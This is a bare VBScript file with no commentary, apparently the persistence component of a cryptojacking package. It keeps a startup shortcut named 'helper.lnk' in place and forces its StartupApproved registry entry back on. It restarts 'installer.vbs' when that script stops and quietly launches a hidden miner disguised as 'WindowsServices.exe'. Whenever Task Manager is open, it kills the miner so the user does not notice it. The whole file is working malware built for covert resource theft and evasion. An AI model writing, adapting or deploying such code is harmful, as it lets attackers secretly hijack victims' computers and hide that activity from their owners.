on error resume next
Dim ws, strPath, objws, objFile, strFolder, startupPath, MyScript, objWinMgmt, colProcess, vaprocess, miner, tskProcess, nkey, key
Set ws = WScript.CreateObject("WScript.Shell")


nkey = "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder\helper.lnk"

Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")


strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)
strPath = strFolder & "\"
startupPath = ws.SpecialFolders("startup")

miner = Chr(34) & strPath & "WindowsServices.exe" & Chr(34)

MyScript = "helper.vbs"


While True
	key = Empty
	key = ws.regread (nkey)
	If (not IsEmpty(key)) then
	
		ws.RegWrite nkey, 2, "REG_BINARY"	
	End if
	
	If (not objws.fileexists(startupPath & "\helper.lnk")) then
		Set link = ws.CreateShortcut(startupPath & "\helper.lnk")
		link.Description = "helper"
		link.TargetPath =chr(34) & strPath & "helper.vbs" & chr(34)
		link.WorkingDirectory = strPath
		link.Save
	End If

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

	call procheck(colProcess, "installer.vbs")

	Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%WindowsServices.exe%'")
	Set tskProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name Like '%Taskmgr.exe%'")

	if colProcess.count = 0 And tskProcess.count = 0  then

		ws.Run miner, 0
	
	ElseIf colProcess.count > 0 And tskProcess.count > 0 then

		For Each objProcess In colProcess
			ws.run "taskkill /PID " & objProcess.ProcessId , 0 
		Next
		
	end if
	WScript.Sleep 3000
Wend



'---------------------------------------------------------------------------------

sub procheck(checkme, procname)

For Each objProcess In checkme
	vaprocess = objProcess.CommandLine
	
		if instr(vaprocess, procname) then
			Exit sub
		End if
	
Next

ws.Run Chr(34) & strPath & procname & Chr(34)

end sub

'--------------------------------------------------------------------------------

